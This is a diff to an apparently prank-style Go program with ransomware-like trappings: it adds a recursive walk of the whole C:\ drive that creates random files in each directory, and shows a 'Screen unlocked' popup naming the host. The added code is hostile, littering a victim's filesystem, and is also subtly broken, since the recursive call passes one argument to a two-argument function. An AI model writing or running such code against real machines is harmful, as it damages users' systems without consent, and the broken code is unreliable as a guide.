@@ -83,21 +83,45 @@ func createRandomFiles(numberOfFiles int) {
 	}
 }
 
-// func createRandomFilesRecursive(numberOfFiles int) {
-// 	i := 0
-// 	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
-// 	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
-// 	for i < numberOfFiles {
-// 		os.Create(rickRoll[i])
-// 		i++
-// 	}
-// }
+func filesystemTraversal(root string, numberOfFiles int) {
+	file, err := os.Open(root)
+	if err != nil {
+		return
+	}
+	fileInfo, err := file.Stat()
+	if err != nil {
+		panic(err)
+	}
+	if fileInfo.IsDir() {
+		if root == "C:\\Windows\\" {
+			return
+		}
+		if root == "C:\\$Recyle.Bin\\" {
+			return
+		}
+		fmt.Println(root)
+		createRandomFiles(numberOfFiles)
+		entries, err := os.ReadDir(root)
+		if err != nil {
+			panic(err)
+		}
+		for _, e := range entries {
+			newRoot := root + e.Name() + "\\"
+			filesystemTraversal(newRoot)
+		}
+
+	} else {
+		return
+	}
+	fmt.Println("Recursion Success")
+}
 
 func main() {
 	numberOfRandomFiles := 30 //Dont go over 50
 	imgURL := "https://brightlineit.com/wp-content/uploads/2017/10/171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
 	img := "171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
 	Hostname, err := os.Hostname()
+	root := "C:\\"
 	if err != nil {
 		panic(err)
 	}
@@ -110,7 +134,7 @@ func main() {
 	message := "Screen unlocked ya " + Hostname + "\x00" //Add the x00 or Windows loses it
 	title := "Yeah Yeah ... Bravoooo\x00"
 	createPopUp(title, message)
-	createRandomFiles(numberOfRandomFiles)
+	filesystemTraversal(root, numberOfRandomFiles)
 	// processList, err := process.GetProcesses()
 	// if err != nil {
 	// 	panic(err)
